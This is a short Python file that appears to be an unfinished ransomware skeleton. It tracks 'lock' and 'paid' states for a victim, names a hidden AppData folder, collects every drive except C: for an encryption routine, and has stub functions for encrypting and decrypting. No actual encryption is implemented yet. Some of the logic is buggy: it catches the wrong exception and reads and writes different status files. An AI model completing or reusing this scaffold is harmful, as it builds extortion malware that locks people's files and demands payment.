import os
import json
import string

__rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
testPath = "./data/"

def checkfile():
    rmfilePath = testPath + "a.json"
    
    #0:沒檔案or未加密,1:有檔案未繳錢,2:有檔案已繳錢
    try:
        with open(rmfilePath,"r") as file:
            data = json.load(file)
            #print(json.dumps(data,indent=4))
            if(data["lock"] == 0):
                return 0
            elif(data["lock"] == 1 and data["paid"] == 0):
                return 1
            elif(data["lock"] == 1 and data["paid"] == 1):
                return 2
    except FileExistsError:
        print("No found")
        return 0

def __createCheckfile():
    rmfilePath = testPath + "b.json"
    data = {
        "lock":1,
        "paid":0
        }
    with open(rmfilePath,"w") as file:
        json.dump(data,file,indent=4)

def _getAvaiblableDrives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = letter + ":/"
        if os.path.exists(drive):
            drives.append(drive)
    drives.remove("C:/")
    return drives

def runEncryption():
    print("加密開始")
    __createCheckfile()
    drives = _getAvaiblableDrives()


def rundeCryption():
    print("解密開始")